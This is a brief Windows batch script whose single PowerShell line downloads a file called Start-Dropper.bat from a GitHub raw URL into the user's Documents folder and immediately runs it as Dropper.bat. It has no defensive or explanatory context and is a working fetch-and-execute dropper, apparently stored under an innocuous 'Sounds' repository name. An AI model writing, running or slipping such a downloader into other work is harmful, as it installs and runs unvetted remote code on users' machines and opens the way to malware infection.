@echo off 
powershell cd %userprofile%\documents; invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/Start-Dropper.bat'-Outfile ./Dropper.bat; Start-Process -FilePath 'Dropper.bat'
exit
